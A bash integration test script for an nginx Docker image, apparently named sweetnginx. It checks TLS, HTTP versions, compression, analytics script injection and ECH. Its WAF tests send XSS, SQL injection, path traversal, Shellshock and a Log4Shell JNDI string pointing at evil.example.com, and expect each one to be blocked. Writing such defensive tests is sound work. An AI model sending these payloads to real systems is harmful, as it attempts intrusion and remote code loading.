#!/usr/bin/env bash
set -uo pipefail

IMAGE="${1:-sweetnginx:test}"
CONTAINER="sweetnginx-test-$$"
CERT_DIR=$(mktemp -d)
ECH_DIR=$(mktemp -d)
PASS=0
FAIL=0

RED='\033[0;31m'; GREEN='\033[0;32m'; BOLD='\033[1m'; NC='\033[0m'

HTTP_PORT=18080
HTTPS_PORT=18443

cleanup() {
  docker rm -f "$CONTAINER" 2>/dev/null || true
  rm -rf "$CERT_DIR" "$ECH_DIR"
}
trap cleanup EXIT

curl_() { curl -sk --max-time 10 "$@"; }

if docker image inspect curl-ech:latest >/dev/null 2>&1; then
  curl_ech_() { docker run --rm --network=host curl-ech:latest -k --max-time 10 "$@"; }
else
  curl_ech_() { curl_  "$@"; }
fi

http()  { curl_ "http://localhost:${HTTP_PORT}$1"; }
https() { curl_ "https://localhost:${HTTPS_PORT}$1"; }

status_http()  { curl_ -o /dev/null -w '%{http_code}' "http://localhost:${HTTP_PORT}$1"; }
status_https() { curl_ -o /dev/null -w '%{http_code}' "https://localhost:${HTTPS_PORT}$1"; }
version_()     { curl_ "$@" -o /dev/null -w '%{http_version}'; }

label() { printf "  %-50s" "$1"; }
pass()  { echo -e "${GREEN}PASS${NC}"; PASS=$((PASS+1)); }
fail()  { echo -e "${RED}FAIL${NC}  ← $1"; FAIL=$((FAIL+1)); }

check() {
  local name="$1"; shift
  label "$name"
  local out
  if out=$("$@" 2>&1); then pass; else fail "$out"; fi
}

echo -e "\n${BOLD}sweetnginx integration test${NC}\n"

if ! curl --version 2>&1 | grep -iE 'ngtcp2|OSSL-QUIC|quiche|HTTP3' > /dev/null; then
  echo "ERROR: host curl does not have HTTP/3 support (need ngtcp2, OSSL-QUIC, quiche, or HTTP3)"
  exit 1
fi

echo "Generating ECH key..."
if docker run --rm -v "$ECH_DIR:/etc/nginx/ech" "$IMAGE" \
    gen-ech-keys localhost >/dev/null 2>&1; then
  ECH_KEY_READY=true
else
  ECH_KEY_READY=false
fi

echo "Generating TLS certificate..."
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout "$CERT_DIR/tls.key" \
  -out    "$CERT_DIR/tls.crt" \
  -days 1 -subj '/CN=localhost' \
  -addext 'subjectAltName=IP:127.0.0.1,DNS:localhost' 2>/dev/null

REPO="$(cd "$(dirname "$0")/.." && pwd)"

echo "Starting nginx..."
docker run -d --name "$CONTAINER" \
  -p "${HTTP_PORT}:80" \
  -p "${HTTPS_PORT}:443/tcp" \
  -p "${HTTPS_PORT}:443/udp" \
  -v "$REPO/conf/nginx.test.conf:/usr/local/openresty/nginx/conf/nginx.conf:ro" \
  -v "$CERT_DIR:/etc/nginx/tls:ro" \
  -v "$ECH_DIR:/etc/nginx/ech:ro" \
  "$IMAGE" >/dev/null

printf "Waiting for nginx to become ready"
for i in $(seq 1 30); do
  if curl_ -sf "http://localhost:${HTTP_PORT}/_gwhealthz" >/dev/null 2>&1; then
    echo -e " ${GREEN}ready${NC}\n"
    break
  fi
  if [ "$i" -eq 30 ]; then
    echo " timed out"
    docker logs "$CONTAINER"
    exit 1
  fi
  printf "."
  sleep 1
done

echo -e "${BOLD}TLS${NC}"

label "TLS 1.2 accepted"
s=$(curl_ --tlsv1.2 --tls-max 1.2 -sk -o /dev/null -w '%{http_code}' "https://localhost:${HTTPS_PORT}/")
if [ "$s" = "200" ]; then pass; else fail "status: $s"; fi

label "TLS 1.3 accepted"
s=$(curl_ --tlsv1.3 -sk -o /dev/null -w '%{http_code}' "https://localhost:${HTTPS_PORT}/")
if [ "$s" = "200" ]; then pass; else fail "status: $s"; fi

check "Alt-Svc header advertises HTTP/3" bash -c \
  "curl -skI --max-time 10 https://localhost:${HTTPS_PORT}/ | grep -qi 'alt-svc:.*h3'"

echo ""
echo -e "${BOLD}HTTP versions${NC}"

check "HTTP/1.1 request" \
  curl_ --http1.1 -sf "http://localhost:${HTTP_PORT}/_gwhealthz"

check "HTTP/2 request" \
  curl_ --http2 -sf "https://localhost:${HTTPS_PORT}/_gwhealthz"

label "HTTP/3 request"
if curl_ --http3-only -sf "https://localhost:${HTTPS_PORT}/_gwhealthz" || \
   curl_ --http3-only -sf "https://localhost:${HTTPS_PORT}/_gwhealthz"; then
  pass
else
  fail "HTTP/3 request failed after retry"
fi

label "HTTP/2 protocol negotiated"
v=$(version_ --http2 "https://localhost:${HTTPS_PORT}/")
if echo "$v" | grep -q "^2"; then pass; else fail "got: $v"; fi

label "HTTP/3 protocol negotiated"
h3_ver_ok=false
for _h3_retry in 1 2 3; do
  v=$(version_ --http3-only "https://localhost:${HTTPS_PORT}/")
  if echo "$v" | grep -q "^3"; then h3_ver_ok=true; break; fi
done
if $h3_ver_ok; then pass; else fail "got: $v"; fi

echo ""
echo -e "${BOLD}Response headers${NC}"

label "Server header suppressed"
if ! curl_ -sf -I "http://localhost:${HTTP_PORT}/" | grep -qi "^server:"; then
  pass
else
  fail "Server header present"
fi

echo ""
echo -e "${BOLD}Compression${NC}"

label "Gzip"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: gzip" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -qi "content-encoding: gzip"; then pass; else fail "no content-encoding: gzip"; fi

label "Brotli"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: br" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -qi "content-encoding: br"; then pass; else fail "no content-encoding: br"; fi

label "Zstd"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: zstd" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -qi "content-encoding: zstd"; then pass; else fail "no content-encoding: zstd"; fi

label "Gzip over HTTPS"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: gzip" "https://localhost:${HTTPS_PORT}/test-gzip" \
    | grep -qi "content-encoding: gzip"; then pass; else fail "no content-encoding: gzip"; fi

label "Brotli over HTTPS"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: br" "https://localhost:${HTTPS_PORT}/test-gzip" \
    | grep -qi "content-encoding: br"; then pass; else fail "no content-encoding: br"; fi

label "Zstd over HTTPS"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: zstd" "https://localhost:${HTTPS_PORT}/test-gzip" \
    | grep -qi "content-encoding: zstd"; then pass; else fail "no content-encoding: zstd"; fi

label "Prefers brotli over gzip when both offered"
enc=$(curl_ -sf -D - -o /dev/null -H "Accept-Encoding: gzip, br" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -i "^content-encoding:" | tr -d '\r')
if echo "$enc" | grep -qi "br"; then pass; else fail "got: $enc"; fi

echo ""
echo -e "${BOLD}sub_filter${NC}"

label "Analytics script injected in HTML"
if curl_ -sf "https://localhost:${HTTPS_PORT}/test-html" | grep -q "trace.pmh.codes"; then
  pass
else
  fail "script tag not found in response"
fi

label "Script tag placed inside <head>"
if curl_ -sf "https://localhost:${HTTPS_PORT}/test-html" \
    | grep -q '<head><script src="https://trace.pmh.codes'; then
  pass
else
  fail "unexpected position in response"
fi

echo ""
echo -e "${BOLD}ModSecurity WAF${NC}"

label "Normal request allowed (200)"
s=$(status_http "/")
if [ "$s" = "200" ]; then pass; else fail "status: $s"; fi

label "XSS blocked (403)"
s=$(status_http "/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "SQL injection blocked (403)"
s=$(status_http "/?q=1%27%20OR%20%271%27%3D%271")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "Path traversal blocked (403)"
s=$(status_http "/?q=..%2F..%2F..%2Fetc%2Fpasswd")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "Log4Shell blocked (403)"
s=$(curl_ -o /dev/null -w '%{http_code}' \
  -H 'X-Api-Version: ${jndi:ldap://evil.example.com/a}' \
  "http://localhost:${HTTP_PORT}/")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "Shellshock blocked (403)"
s=$(curl_ -o /dev/null -w '%{http_code}' \
  -H 'User-Agent: () { :; }; /bin/sh -c id' \
  "http://localhost:${HTTP_PORT}/")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

echo ""
echo -e "${BOLD}ECH${NC}"

if [ "${ECH_KEY_READY:-false}" = "true" ]; then
  label "ECH keys loaded (nginx log)"
  if docker logs "$CONTAINER" 2>&1 | grep -q "ECH.*keys loaded"; then
    pass
  else
    fail "no 'ECH: keys loaded' in nginx log"
  fi

  label "ECH GREASE accepted"
  ech_err=$(curl_ech_ --ech grease --head "https://localhost:${HTTPS_PORT}/" 2>&1)
  ech_rc=$?
  if [ $ech_rc -eq 0 ]; then
    pass
  elif echo "$ech_err" | grep -qi "unknown option\|option --ech"; then
    printf "\033[0;33mSKIP\033[0m (curl lacks --ech)\n"
  else
    fail "$ech_err"
  fi

  label "Real ECH handshake"
  ech_b64=$(docker exec "$CONTAINER" \
    sed -n '/-----BEGIN ECHCONFIG-----/,/-----END ECHCONFIG-----/{/-----BEGIN/d;/-----END/d;p}' \
    /etc/nginx/ech/server.ech.pem 2>/dev/null | tr -d '\n\r ')
  if [ -z "$ech_b64" ]; then
    printf "\033[0;33mSKIP\033[0m (could not extract ECHConfigList)\n"
  else
    ech_real_err=$(curl_ech_ --ech "ecl:${ech_b64}" -sf \
      "https://localhost:${HTTPS_PORT}/" 2>&1)
    ech_real_rc=$?
    if [ $ech_real_rc -eq 0 ]; then
      pass
    elif echo "$ech_real_err" | grep -qi "unknown option\|option --ech"; then
      printf "\033[0;33mSKIP\033[0m (curl lacks --ech ecl)\n"
    else
      fail "$ech_real_err"
    fi
  fi

  label "ECH GREASE accepted over HTTP/3"
  ech_h3_ok=false
  for _retry in 1 2 3; do
    ech_h3_err=$(curl_ech_ --ech grease --http3-only \
      -f "https://localhost:${HTTPS_PORT}/" 2>&1)
    if [ $? -eq 0 ]; then ech_h3_ok=true; break; fi
    if echo "$ech_h3_err" | grep -qi "unknown option\|option --ech"; then break; fi
  done
  if $ech_h3_ok; then
    pass
  elif echo "$ech_h3_err" | grep -qi "unknown option\|option --ech"; then
    printf "\033[0;33mSKIP\033[0m (curl lacks --ech)\n"
  else
    fail "$ech_h3_err"
  fi
else
  label "ECH tests (key generation failed)"
  printf "\033[0;33mSKIP\033[0m\n"
fi

echo ""
echo "────────────────────────────────────────────"
echo -e "  ${GREEN}${PASS} passed${NC}   ${RED}${FAIL} failed${NC}"
echo "────────────────────────────────────────────"

exit $FAIL
